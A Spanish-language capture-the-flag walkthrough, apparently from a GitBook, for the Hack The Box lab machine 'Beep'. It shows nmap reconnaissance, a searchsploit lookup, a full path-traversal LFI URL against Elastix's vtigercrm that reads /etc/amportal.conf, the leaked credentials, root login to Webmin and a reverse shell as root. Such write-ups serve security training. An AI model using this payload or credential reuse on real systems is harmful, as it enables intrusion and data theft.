---
description: '✍️ Autor: ch4p 🔍 Dificultad: Fácil 📅 Fecha de creación: 16/10/2017'
---

# Beep

### 🔍 RECONOCIMIENTO

En primer lugar, tras conectarnos a la máquina, utilizamos el comando:

```bash
ping -c 1 10.10.10.7
```

para verificar la conectividad de red.

<figure><img src="../../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

A continuación, realizamos el comando:

```bash
nmap -sC -sV 10.10.10.7
```

para realizar un escaneo de puertos y servicios detallado en la dirección IP.

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Durante el escaneo se identificaron los siguientes puertos abiertos:

* **22 (SSH - OpenSSH 4.3)**: Versión antigua, posible explotación y fuerza bruta.
* **25 (SMTP - Postfix)**: Puede filtrar usuarios o permitir envío sin autenticación (open relay).
* **80/443 (HTTP/HTTPS - Apache 2.2.3)**: Versión vulnerable, revisar exploits y probar SQLi, XSS, LFI.
* **110/995 (POP3/POP3s - Cyrus)**: Posible captura de credenciales en texto claro, probar autenticación.
* **111 (RPCBind)**: Puede permitir enumeración y ejecución remota de código.
* **143/993 (IMAP/IMAPs - Cyrus)**: Posible ataque de autenticación o exploits específicos.
* **3306 (MySQL - Acceso no autorizado)**: Intentar acceso con credenciales por defecto.
* **4445 (Servicio desconocido)**: Revisar banners y comportamiento con `nc`.
* **10000 (Webmin - MiniServ 1.570)**: **Vulnerable a RCE**, buscar exploits.

A continuación, se procederá a analizar cada uno de estos servicios en busca de posibles vectores de ataque.

### 🔎 EXPLORACIÓN

Se utiliza el comando:

```bash
sudo nmap -sCV -p22,25,80,443,110,995,143,993,3306,4445,10000 -v 10.10.10.7
```

para que nos proporcione más información sobre esos puertos específicamente.

<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Miramos el puerto 80.

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### 🚀 **EXPLOTACIÓN**

Probamos credenciales por defecto pero no hay resultado. Vamos a ver si **Elastix** tiene alguna vulnerabilidad para explotar.

```bash
searchsploit elastix
```

<figure><img src="../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Vemos que tenemos una vulnerabilidad **LFI** por lo que la explotamos. Descargamos el archivo.

```bash
searchsploit -m php/webapps/37637.pl
```

Vemos el contenido.

<figure><img src="../../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Observamos el exploit LFI que tiene por lo que es lo que hacemos a continuación.

```bash
https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action
```

<figure><img src="../../.gitbook/assets/image (6) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Al parecer aparecen unas credenciales.

<figure><img src="../../.gitbook/assets/image (7) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

```
admin:jEhdIekWmdjE
```

Nos intentamos loguear con esas credenciales en el servicio **Webmin**.&#x20;

> Nota: las credenciales son root como usuario y misma contraseña.

<figure><img src="../../.gitbook/assets/image (8) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Podemos ejecutar una tarea como root y eso hacemos para una Reverse Shell.

<figure><img src="../../.gitbook/assets/image (10) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### 🔐 **PRIVILEGIOS**

Al estar dentro y ejecutar:

```bash
whoami
```

<figure><img src="../../.gitbook/assets/image (11) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Ya somos **root**.

<figure><img src="../../.gitbook/assets/image (1233).png" alt=""><figcaption></figcaption></figure>
